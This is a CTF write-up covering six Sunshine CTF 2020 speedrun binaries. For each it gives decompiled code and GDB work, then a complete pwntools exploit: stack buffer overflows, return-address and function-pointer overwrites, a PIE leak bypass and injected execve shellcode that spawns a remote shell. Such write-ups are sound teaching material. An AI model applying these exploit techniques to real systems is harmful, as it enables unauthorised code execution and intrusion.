# Sunshine CTF 2020 Speedrun
This repo contains my solutions for the Sunshine CTF speedrun challenges. The binary files are provided by https://sunshinectf.org/.

## chall_00
---
The first step is to decompile the binary to understand how it works.

Ghidra outputs:
```c

void main(void)
{
  char local_48 [56];
  int local_10;
  int local_c;
  
  puts("This is the only one");
  gets(local_48);
  if (local_c == 0xfacade) {
    system("/bin/sh");
  }
  if (local_10 == 0xfacade) {
    system("/bin/sh");
  }
  return;
}
```

There are three variables initialized that we don't control the values of. If `local_c` or `local_10` somehow become equal to the constant `0xfacade`, we will gain shell access.

The man page for `gets` has this to say about it:
> GETS

> NAME

>        gets - get a string from standard input (DEPRECATED)

> SYNOPSIS

>        #include <stdio.h>

>        char *gets(char *s);

> DESCRIPTION

>        Never use this function.

>        gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte ('\0').  No check for buffer overrun is performed (see BUGS below).

A buffer overflow should be possible. We should be able to write enough characters into `gets` that it overflows into the memory reserved for `local_c` and `local_10`.

We can run the program with a very identifiable input of `AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ`, and then use a debugger to break immediately before the first comparison to see which letter is being compared with the `0xfacade` constant. This will show us how many throwaway characters we need before typing the constant.

GDB can be used for debugging. Disassembling the binary provides:
```assembly
(gdb) disassemble main
Dump of assembler code for function main:
   0x00005555555546ca <+0>:     push   %rbp
   0x00005555555546cb <+1>:     mov    %rsp,%rbp
   0x00005555555546ce <+4>:     sub    $0x40,%rsp
   0x00005555555546d2 <+8>:     lea    0xcb(%rip),%rdi        # 0x5555555547a4
   0x00005555555546d9 <+15>:    callq  0x555555554580 <puts@plt>
   0x00005555555546de <+20>:    lea    -0x40(%rbp),%rax
   0x00005555555546e2 <+24>:    mov    %rax,%rdi
   0x00005555555546e5 <+27>:    mov    $0x0,%eax
   0x00005555555546ea <+32>:    callq  0x5555555545a0 <gets@plt>
   0x00005555555546ef <+37>:    cmpl   $0xfacade,-0x4(%rbp)
   0x00005555555546f6 <+44>:    jne    0x555555554704 <main+58>
   0x00005555555546f8 <+46>:    lea    0xba(%rip),%rdi        # 0x5555555547b9
   0x00005555555546ff <+53>:    callq  0x555555554590 <system@plt>
   0x0000555555554704 <+58>:    cmpl   $0xfacade,-0x8(%rbp)
   0x000055555555470b <+65>:    jne    0x555555554719 <main+79>
   0x000055555555470d <+67>:    lea    0xa5(%rip),%rdi        # 0x5555555547b9
   0x0000555555554714 <+74>:    callq  0x555555554590 <system@plt>
   0x0000555555554719 <+79>:    nop
   0x000055555555471a <+80>:    leaveq
   0x000055555555471b <+81>:    retq
End of assembler dump.
```

Let's insert a breakpoint right before the comparison:
```assembly
(gdb) break *(main+58)
Breakpoint 1 at 0x555555554704
```

Re running the program, we can print the value being compared with `0xfacade` ($rbp - 0x4).
```
(gdb) r
Starting program: /mnt/c/Users/meraxes/dev/ctf/sunshinectf2020/chall_00
This is the only one
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ

Breakpoint 1, 0x0000555555554704 in main ()
(gdb) p (char*) $rbp - 0x4
$1 = 0x7fffffffe24c "PPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
```

This means that we would need to put the constant into our input as soon as the "P" starts in the string. It makes sense that this value would be at "P". Recall from the Ghidra output above, `local_48` is a `char` array with 56 members. This puts us at 56 bytes needed. `local_10` is an `int`, which requires 4 bytes of space. In total, we need 60 bytes before we reach the memory for `local_c`.  There are 60 character taking up 60 bytes in the letters A through O.

With all the information here, we can write a program to run the exploit end to end.

```python
#!/usr/bin/env python3

from pwn import *

context.binary = ELF('./chall_00')

if args.REMOTE:
    io = remote('chal.2020.sunshinectf.org', 30000)
else:
    io = process(context.binary.path)
    
print(io.recvline())

buffer = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO'
payload = p32(0xfacade)

io.sendline(flat(buffer, payload))
io.interactive()
```

Note that we needed to use a pack function on the constant to send. The binary was made on a little endian system, and the bytes need to be sent in reverse.

Running the program gives us shell access on Sunshine's server:
```sh
meraxes@pantheon:/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020$ ./chall_00.py REMOTE
[*] '/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020/chall_00'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to chal.2020.sunshinectf.org on port 30000: Done
b'This is the only one\n'
Sending:  b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO\xde\xca\xfa\x00'
[*] Switching to interactive mode
$ ls
chall_00
flag.txt
$ cat flag.txt
sun{burn-it-down-6208bbc96c9ffce4}
$ 
```

## chall_01
---

Let's take a peek at the decompilation output:
```c
void main(void)

{
  char local_68 [64];
  char local_28 [24];
  int local_10;
  int local_c;
  
  puts("Long time ago, you called upon the tombstones");
  fgets(local_28,0x13,stdin);
  gets(local_68);
  if (local_c == 0xfacade) {
    system("/bin/sh");
  }
  if (local_10 == 0xfacade) {
    system("/bin/sh");
  }
  return;
}
```

This program is very similar to chall_00. The difference is that it takes two inputs now (the first being protected against buffer overflows). The inputs are read into two different `char` arrays. Since the second input is using `gets`, we can still perform the same attack as before. 

`gets` puts its value into `local_68`. That array has a size of 64 bytes. After filling it, we need to overwrite 24 more bytes to fill `local_28`. At this point we are at the memory reserved for `local_10`. The constant `0xfacade` can be written here in our input.

```python
#!/usr/bin/env python3

from pwn import *

context.binary = ELF('./chall_01')

if args.REMOTE:
    io = remote('chal.2020.sunshinectf.org', 30001)
else:
    io = process(context.binary.path)
print(io.recvline())

buffer = 'A' * 88
payload = p32(0xfacade)
exploit = flat(buffer, payload)

io.sendline('giveflagpls')
print("Sending: ", exploit)
io.sendline(exploit)

io.interactive()
```

Running our exploit:
```sh
meraxes@pantheon:/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020$ ./chall_01.py REMOTE
[*] '/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020/chall_01'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to chal.2020.sunshinectf.org on port 30001: Done
b'Long time ago, you called upon the tombstones\n'
Sending:  b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xde\xca\xfa\x00'
[*] Switching to interactive mode
$ ls
chall_01
flag.txt
$ cat flag.txt
sun{eternal-rest-6a5ee49d943a053a}
$  
```

## chal_02
---
The decompilation output is pretty different this time around. Let's take a look.

```c
void main(void)

{
  char local_24 [20];
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  puts("Went along the mountain side.");
  fgets(local_24,0x13,stdin);
  vuln();
  return;
}
```

There's a call to another method. Let's inspect `vuln()` as well:

```c
void vuln(void)

{
  char local_3e [54];
  
  __x86.get_pc_thunk.ax();
  gets(local_3e);
  return;
}
```

There is no direct way to gain shell access by these two functions. Looking around a bit more, we can see that there is a third function that never gets called:

```c
void win(void)

{
  int iVar1;
  
  iVar1 = __x86.get_pc_thunk.ax();
  system((char *)(iVar1 + 0x12e));
  return;
}
```

Looks promising. 

The `vuln()` function is still using `gets()`. We will be able to overwrite the return address of the function with the address of `win()`.

The quick way to find what size input we need to overwrite the return address is to call the program with the alphabet string and run it in a debugger:

```sh
(gdb) r 
Starting program: /mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020/chall_02 
Went along the mountain side.
throwaway
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ

Program received signal SIGSEGV, Segmentation fault.
0x51515050 in ?? ()
```

As expected, the program crashed from trying to jump to a return address that didn't make sense. The program crashed at address `0x51515050`. Hex 51 is Q and hex 50 is P. (Remember this is little endian, which is why the results seem reversed). Now we know that the payload needs to start after 2 Ps in the string.

The place we want to get to is the address of the win function:

```assembly
(gdb) disassemble win
Dump of assembler code for function win:
   0x080484d6 <+0>:     push   %ebp
   ...
```

Full exploit:

```python
#!/usr/bin/env python3

from pwn import *

context.binary = ELF('./chall_02')

if args.REMOTE:
    io = remote('chal.2020.sunshinectf.org', 30002)
else:
    io = process(context.binary.path)

print(io.recvline())
io.sendline('throwaway')

buffer = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPP'
payload = p32(0x080484d6) # address of win function
exploit = flat(buffer, payload)


print("Sending: ", exploit)
io.sendline(exploit)

io.interactive()
```

Output:
```sh
meraxes@pantheon:/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020$ ./chall_02.py REMOTE
[*] '/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020/chall_02'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to chal.2020.sunshinectf.org on port 30002: Done
b'Went along the mountain side.\n'
Sending:  b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPP\xd6\x84\x04\x08'
[*] Switching to interactive mode
$ cat flag.txt
sun{warmness-on-the-soul-3b6aad1d8bb54732}
```

## chall_04
---
Skipping ahead to challenge 4 since it is similar to 2.

Decompilation:

```c
void vuln(void)

{
  char local_48 [56];
  code *local_10;
  
  fgets(local_48,100,stdin);
  (*local_10)();
  return;
}

void win(void)

{
  system("/bin/sh");
  return;
}

```

No using `gets` this time around! There is another kind of vulnerability here though. Notice how `fgets` is reading 100 bytes into `local_48`, which is a 56 byte array. The leftover input can be used to overwrite local_10 and change where the function jumps to.

Exploit:
```python
#!/usr/bin/env python3

from pwn import *

context.binary = ELF('./chall_04')

if args.REMOTE:
    io = remote('chal.2020.sunshinectf.org', 30004)
else:
    io = process(context.binary.path)

print(io.recvline())
io.sendline('throwaway')

buffer = 'A' * 56
payload = p64(0x04005b7) # address of win function

exploit = flat(buffer, payload)
print("Sending: ", exploit)
io.sendline(exploit)

io.interactive()
```

Output:
```sh
meraxes@pantheon:/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020$ ./chall_04.py REMOTE
[*] '/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020/chall_04'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to chal.2020.sunshinectf.org on port 30004: Done
b'Like some kind of madness, was taking control.\n'
Sending:  b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb7\x05@\x00\x00\x00\x00\x00'
[*] Switching to interactive mode
$ cat flag.txt
sun{critical-acclaim-96cfde3d068e77bf}
```

## chall_05
---
```c
void vuln(void)

{
  char local_48 [56];
  code *local_10;
  
  printf("Yes I\'m going to win: %p\n",main);
  fgets(local_48,100,stdin);
  (*local_10)();
  return;
}

void win(void)

{
  system("/bin/sh");
  return;
}
```

As far as the code goes, this challenge is almost the same as the previous one. This binary was compiled differently, however:
```sh
meraxes@pantheon:/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020$ checksec chall_05
[*] '/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020/chall_05'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

PIE (Position Independent Executable) is a security feature where the binary gets loaded into a random memory location every time. This means we can't just hardcode the address of the `win` function like last time.

The `printf` statement prints out the address of the `main` function. Even if the program gets loaded into different locations every time, the functions will be at the same offset from each other. We can store the address of `main` and calculate the address of `win`.

Location of main locally:
```assembly
(gdb)
Starting program: /mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020/chall_05 
Race, life's greatest.
c
Yes I'm going to win: 0x55555555476d
```

Location of win locally:
```assembly
(gdb) x/i win
   0x55555555475a <win>:        push   %rbp
```

The offset difference is `0x55555555475a - 0x55555555476d = -0x13`

```python
#!/usr/bin/env python3

from pwn import *
import re

context.binary = ELF('./chall_05')

if args.REMOTE:
    io = remote('chal.2020.sunshinectf.org', 30005)
else:
    io = process(context.binary.path)    

print(io.recvline())
buffer = 'A' * 56

io.sendline('throwaway')
response = str(io.recvline()) # 'b"Yes I\'m going to win: 0x000xyz\\n"'
print(response)

main_address = re.search("0x[0-9a-f]+", response).group()
offset = 0x13
win_address = int(main_address, 16) - offset
payload = p64(win_address)
exploit = flat(buffer, payload)

print("Sending: ", exploit)
io.sendline(exploit)
io.interactive()
```

```
meraxes@pantheon:/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020$ ./chall_05.py REMOTE
[*] '/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020/chall_05'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to chal.2020.sunshinectf.org on port 30005: Done
b"Race, life's greatest.\n"
b"Yes I'm going to win: 0x56364e61876d\n"
Sending:  b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZ\x87aN6V\x00\x00'
[*] Switching to interactive mode
$ cat flag.txt
sun{chapter-four-9ca97769b74345b1}
```

## chall_03
---
```c
void main(void)

{
  char local_28 [32];
  
  puts("Just in time.");
  fgets(local_28,0x13,stdin);
  vuln();
  return;
}

void vuln(void)

{
  char local_78 [112];
  
  printf("I\'ll make it: %p\n",local_78);
  gets(local_78);
  return;
}

```

`main` and `vuln` are the only functions in this binary. The print statement reveals the address of `local_78` on the stack. 

Looking at `checksec` can give some inspiration for attacks to try:

```sh
meraxes@pantheon:/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020$ checksec chall_03
[*] '/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020/chall_03'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

RWX means the binary has segments that are readable writable and executable. Since there is no `win` function, we will be able to write our own, inject it via `gets`, and then have the program execute it. We can fill `local_78` with shellcode that will run `/bin/sh`, and then overwrite the return address of `vuln()` to return to the beginning of that shellcode.

Shellcode to inject:
```assembly
/* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\\x00'] */
    /* push b'sh\\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall

```

Exploit:
```python
#!/usr/bin/env python3

from pwn import *

context.binary = ELF('./chall_03')

if args.REMOTE:
    io = remote('chal.2020.sunshinectf.org', 30003)
else:
    io = process(context.binary.path)    
print(io.recvline())
io.sendline('throwaway')
response = str(io.recvline()) # 'b"I'll make it: 0x000xyz\\n"'
print(response)
stack_address = re.search("0x[0-9a-f]+", response).group()

payload = asm(shellcraft.sh())
buffer = 'A' * (0x78 - len(payload))
exploit = flat(payload, buffer, p64(int(stack_address, 16)))

print("Sending: ", exploit)
io.sendline(exploit)

io.interactive()
```

```sh
meraxes@pantheon:/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020$ ./chall_03.py REMOTE
[*] '/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020/chall_03'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Opening connection to chal.2020.sunshinectf.org on port 30003: Done
b'Just in time.\n'
b"I'll make it: 0x7fff288b7cb0\n"
Sending:  b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb0|\x8b(\xff\x7f\x00\x00'
[*] Switching to interactive mode
$ cat flag.txt
sun{a-little-piece-of-heaven-26c8795afe7b3c49}
```
